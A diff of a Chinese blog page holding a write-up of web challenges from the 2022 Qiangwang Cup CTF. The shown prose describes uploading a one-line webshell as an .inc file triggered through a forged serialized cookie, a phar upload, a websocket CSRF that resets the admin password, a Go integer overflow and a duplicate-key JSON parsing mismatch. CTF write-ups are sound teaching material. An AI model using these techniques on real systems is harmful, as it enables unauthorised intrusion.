@@ -1,11 +1,12 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-    <head>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <meta name="robots" content="noodp" />
-        <title>[2022强网杯] WP - Huamang&#39;s Blog</title><meta name="Description" content="Huamang&#39;s Blog"><meta property="og:title" content="[2022强网杯] WP" />
-<meta property="og:description" content="rcefile 预期解 原题改的：https://cloud.tencent.com/developer/article/1717668 首先是www.zip" />
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title class="pjax-title">[2022强网杯] WP - Huamang&#39;s Blog</title><meta name="Description" content="Huamang&#39;s Blog"><meta property="og:title" content="[2022强网杯] WP" />
+<meta property="og:description" content="rcefile预期解原题改的：https://cloud.tencent.com/developer/article/1717668 首先是w" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://example.com/qwb2022/" /><meta property="og:image" content="https://example.com/logo.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-07-31T20:35:47+08:00" />
@@ -15,11 +16,15 @@
 <meta name="twitter:image" content="https://example.com/logo.png"/>
 
 <meta name="twitter:title" content="[2022强网杯] WP"/>
-<meta name="twitter:description" content="rcefile 预期解 原题改的：https://cloud.tencent.com/developer/article/1717668 首先是www.zip"/>
+<meta name="twitter:description" content="rcefile预期解原题改的：https://cloud.tencent.com/developer/article/1717668 首先是w"/>
 <meta name="application-name" content="LoveIt">
-<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+<meta name="apple-mobile-web-app-title" content="LoveIt">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://example.com/qwb2022/" /><link rel="prev" href="https://example.com/typhoonconctf2022/" /><link rel="next" href="https://example.com/ssti/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://example.com/qwb2022/" /><link rel="prev" href="https://example.com/typhoonconctf2022/" /><link rel="next" href="https://example.com/ssti/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
@@ -28,7 +33,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/example.com\/qwb2022\/"
-        },"image": ["https:\/\/example.com\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  4892 ,
+        },"image": ["https:\/\/example.com\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  4926 ,
         "url": "https:\/\/example.com\/qwb2022\/","datePublished": "2022-07-31T20:35:47+08:00","dateModified": "2022-07-31T20:35:47+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": {
@@ -42,31 +47,38 @@
             },"description": ""
     }
     </script></head>
-    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
 
-        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark');}
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('dark' === 'light' || 'dark' === 'dark' || 'dark' === 'black') setTheme('dark'), saveTheme('dark'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
     <div class="header-wrapper">
         <div class="header-title">
             <a href="/" title="Huamang&#39;s Blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span>Huamang&#39;s Blog</a>
         </div>
         <div class="menu">
-            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/friends/"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw" aria-hidden="true"></i>
-                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/qwb2022/" selected>简体中文</option></select>
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/friends/"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><a href="#" onclick="return false;" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" title="Select Language" id="language-select-desktop" onchange="location = this.value;"><option value="/qwb2022/" selected>简体中文</option></select>
                     </a><span class="menu-item search" id="search-desktop">
                         <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
-                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
-                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
                         </a>
-                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
-                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
                         </a>
                         <span class="search-button search-loading" id="search-loading-desktop">
-                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                         </span>
-                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
-                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
-                </a>
-            </div>
+                    </span><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a></div>
         </div>
     </div>
 </header><header class="mobile" id="header-mobile">
@@ -82,46 +94,70 @@
         <div class="menu" id="menu-mobile"><div class="search-wrapper">
                     <div class="search mobile" id="search-mobile">
                         <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
-                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
-                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
                         </a>
-                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
-                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
                         </a>
                         <span class="search-button search-loading" id="search-loading-mobile">
-                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                         </span>
                     </div>
-                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                    <a href="#" onclick="return false;" class="search-cancel" id="search-cancel-mobile">
                         取消
                     </a>
-                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/friends/" title="">友链</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
-                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
-            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw" aria-hidden="true"></i>
-                    <select class="language-select" onchange="location = this.value;"><option value="/qwb2022/" selected>简体中文</option></select>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/friends/" title="">友链</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="#" onclick="return false;" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" title="Select Language" onchange="location = this.value;"><option value="/qwb2022/" selected>简体中文</option></select>
                 </a></div>
     </div>
-</header><div class="search-dropdown desktop">
-        <div id="search-dropdown-desktop"></div>
-    </div>
-    <div class="search-dropdown mobile">
-        <div id="search-dropdown-mobile"></div>
-    </div><main class="main">
-                <div class="container"><div class="toc" id="toc-auto">
-            <h2 class="toc-title">目录</h2>
-            <div class="toc-content always-active" id="toc-content-auto"></div>
-        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[2022强网杯] WP</h1><div class="post-meta">
-            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Huamang</a>
-</span>&nbsp;<span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CTF</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-07-31">2022-07-31</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 4892 字&nbsp;
-                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 10 分钟&nbsp;<i class="far fa-eye fa-fw"></i>
-                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-                <span id="busuanzi_container_site_pv">访问量<span id="busuanzi_value_site_pv"></span>次</span>
-            </div>
-        </div><div class="details toc" id="toc-static"  data-kept="">
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content always-active" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#rcefile">rcefile</a>
+      <ul>
+        <li><a href="#预期解">预期解</a></li>
+        <li><a href="#非预期解">非预期解</a></li>
+      </ul>
+    </li>
+    <li><a href="#babyweb">babyweb</a>
+      <ul>
+        <li><a href="#go的整数溢出">go的整数溢出</a></li>
+        <li><a href="#json处理不同">json处理不同</a></li>
+      </ul>
+    </li>
+    <li><a href="#easyweb">easyweb</a></li>
+    <li><a href="#crash">crash</a>
+      <ul>
+        <li><a href="#非预期">非预期</a></li>
+        <li><a href="#预期">预期</a></li>
+      </ul>
+    </li>
+    <li><a href="#wp-um">WP-UM</a></li>
+    <li><a href="#easylogin">easylogin</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle", "normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[2022强网杯] WP</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="/" title="Author" rel=" author" class="author">Huamang</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-07-31">2022-07-31</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2022-07-31">2022-07-31</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 4926 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 10 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
                     <span>目录</span>
-                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
                 </div>
                 <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
@@ -148,18 +184,18 @@
     <li><a href="#easylogin">easylogin</a></li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><h1 id="rcefile">rcefile</h1>
-<h2 id="预期解">预期解</h2>
-<p>原题改的：https://cloud.tencent.com/developer/article/1717668</p>
+            </div><div class="content" id="content"><h1 id="rcefile" class="headerLink">
+    <a href="#rcefile" class="header-mark"></a>rcefile</h1><h2 id="预期解" class="headerLink">
+    <a href="#%e9%a2%84%e6%9c%9f%e8%a7%a3" class="header-mark"></a>预期解</h2><p>原题改的：https://cloud.tencent.com/developer/article/1717668</p>
 <p>首先是www.zip源码泄露</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220731203952360.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220731203952360.png, https://tuchuang.huamang.xyz/img/image-20220731203952360.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220731203952360.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220731203952360.png"
-        title="image-20220731203952360" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220731203952360.png" title="image-20220731203952360" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220731203952360.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220731203952360.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220731203952360.png, https://tuchuang.huamang.xyz/img/image-20220731203952360.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220731203952360.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220731203952360.png">
+    </a></p>
 <p>先看config.inc.php这里有<code>spl_autoload_register()</code>，这个函数是会加载inc文件的</p>
 <p>这里会检测cookie，如果有userfile的话，会进行反序列化</p>
 <div class="highlight"><div class="chroma">
@@ -195,72 +231,72 @@
 </span></code></pre></td></tr></table>
 </div>
 </div><p>这里有文件上传的功能，我们可以上传一个inc文件里面是一句话木马，这里我们把文件名放进cookie里面构造一个序列化数据即可</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802140604182.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802140604182.png, https://tuchuang.huamang.xyz/img/image-20220802140604182.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802140604182.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802140604182.png"
-        title="image-20220802140604182" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802140604182.png" title="image-20220802140604182" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802140604182.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802140604182.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802140604182.png, https://tuchuang.huamang.xyz/img/image-20220802140604182.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802140604182.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802140604182.png">
+    </a></p>
 <p>把cookie替换，成功通过spl_autoload_register()包含</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802140645488.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802140645488.png, https://tuchuang.huamang.xyz/img/image-20220802140645488.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802140645488.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802140645488.png"
-        title="image-20220802140645488" /></p>
-<h2 id="非预期解">非预期解</h2>
-<p>直接上传phar文件，发现是可以解析的</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802140746474.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802140746474.png, https://tuchuang.huamang.xyz/img/image-20220802140746474.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802140746474.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802140746474.png"
-        title="image-20220802140746474" /></p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802140756981.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802140756981.png, https://tuchuang.huamang.xyz/img/image-20220802140756981.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802140756981.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802140756981.png"
-        title="image-20220802140756981" /></p>
-<h1 id="babyweb">babyweb</h1>
-<p>目录扫描到下面结果</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802140954044.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802140954044.png, https://tuchuang.huamang.xyz/img/image-20220802140954044.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802140954044.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802140954044.png"
-        title="image-20220802140954044" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802140645488.png" title="image-20220802140645488" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802140645488.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802140645488.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802140645488.png, https://tuchuang.huamang.xyz/img/image-20220802140645488.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802140645488.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802140645488.png">
+    </a></p>
+<h2 id="非预期解" class="headerLink">
+    <a href="#%e9%9d%9e%e9%a2%84%e6%9c%9f%e8%a7%a3" class="header-mark"></a>非预期解</h2><p>直接上传phar文件，发现是可以解析的</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802140746474.png" title="image-20220802140746474" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802140746474.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802140746474.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802140746474.png, https://tuchuang.huamang.xyz/img/image-20220802140746474.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802140746474.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802140746474.png">
+    </a></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802140756981.png" title="image-20220802140756981" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802140756981.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802140756981.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802140756981.png, https://tuchuang.huamang.xyz/img/image-20220802140756981.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802140756981.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802140756981.png">
+    </a></p>
+<h1 id="babyweb" class="headerLink">
+    <a href="#babyweb" class="header-mark"></a>babyweb</h1><p>目录扫描到下面结果</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802140954044.png" title="image-20220802140954044" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802140954044.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802140954044.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802140954044.png, https://tuchuang.huamang.xyz/img/image-20220802140954044.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802140954044.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802140954044.png">
+    </a></p>
 <p>扫到一个buy，测试一下需要post发包，然后需要admin</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802141024717.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802141024717.png, https://tuchuang.huamang.xyz/img/image-20220802141024717.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802141024717.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802141024717.png"
-        title="image-20220802141024717" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802141024717.png" title="image-20220802141024717" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802141024717.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802141024717.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802141024717.png, https://tuchuang.huamang.xyz/img/image-20220802141024717.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802141024717.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802141024717.png">
+    </a></p>
 <p>看起来是需要拿到admin的权限，然后去这里发包拿flag</p>
 <p>进去里面发现有个修改密码的功能点，还有个报告bug的功能点，这组合起来就是一个csrf的利用了</p>
 <p>这里修改密码是要ws发包过去的，我直接对着题目的js做了一点修改然后放到服务器</p>
 <p>一开始一直没成功，后来发现可能得用内网的地址，刚好题目给了docker部署的命令，所以知道端口是8888</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802144443674.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802144443674.png, https://tuchuang.huamang.xyz/img/image-20220802144443674.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802144443674.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802144443674.png"
-        title="image-20220802144443674" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802144443674.png" title="image-20220802144443674" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802144443674.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802144443674.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802144443674.png, https://tuchuang.huamang.xyz/img/image-20220802144443674.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802144443674.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802144443674.png">
+    </a></p>
 <p>构造如下的csrf脚本</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -313,15 +349,14 @@
 </code></pre></td></tr></table>
 </div>
 </div><p>修改密码进入后，发现有个购买界面，这里的钱只够购买hint，下载到是源码</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802144545699.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802144545699.png, https://tuchuang.huamang.xyz/img/image-20220802144545699.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802144545699.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802144545699.png"
-        title="image-20220802144545699" /><a href="http://app.py" target="_blank" rel="noopener noreffer">app.py</a>
-</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802144545699.png" title="image-20220802144545699" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802144545699.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20220802144545699.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20220802144545699.png, https://tuchuang.huamang.xyz/img/image-20220802144545699.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802144545699.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20220802144545699.png">
+    </a><a href="http://app.py" target="_blank" rel="noopener noreferrer">app.py</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -557,8 +592,8 @@
 <li>go的整数溢出</li>
 <li>python的flask和go的jsonparser对于json同名数据的不同处理</li>
 </ul>
-<h2 id="go的整数溢出">go的整数溢出</h2>
-<p>这里的cost的定义为int64</p>
+<h2 id="go的整数溢出" class="headerLink">
+    <a href="#go%e7%9a%84%e6%95%b4%e6%95%b0%e6%ba%a2%e5%87%ba" class="header-mark"></a>go的整数溢出</h2><p>这里的cost的定义为int64</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -589,8 +624,8 @@
 </code></pre></td></tr></table>
 </div>
 </div><p>这里我们num传入很大的值，就会溢出，导致cost会小于money，这样就成功过了go</p>
-<h2 id="json处理不同">json处理不同</h2>
-<p>这里我搭建了一个本地的环境</p>
+<h2 id="json处理不同" class="headerLink">
+    <a href="#json%e5%a4%84%e7%90%86%e4%b8%8d%e5%90%8c" class="header-mark"></a>json处理不同</h2><p>这里我搭建了一个本地的环境</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -620,14 +655,14 @@
 </code></pre></td></tr></table>
 </div>
 </div><p>可以看到，如果出现了同一个键的json数据，flask里面的get_json会取最后的</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://tuchuang.huamang.xyz/img/image-20220802152526801.png"
-        data-srcset="https://tuchuang.huamang.xyz/img/image-20220802152526801.png, https://tuchuang.huamang.xyz/img/image-20220802152526801.png 1.5x, https://tuchuang.huamang.xyz/img/image-20220802152526801.png 2x"
-        data-sizes="auto"
-        alt="https://tuchuang.huamang.xyz/img/image-20220802152526801.png"
-        title="image-20220802152526801" /></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20220802152526801.png" title="image-20220802152526801" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20220802152526801.png">
+        <img
+            class="lazyload"
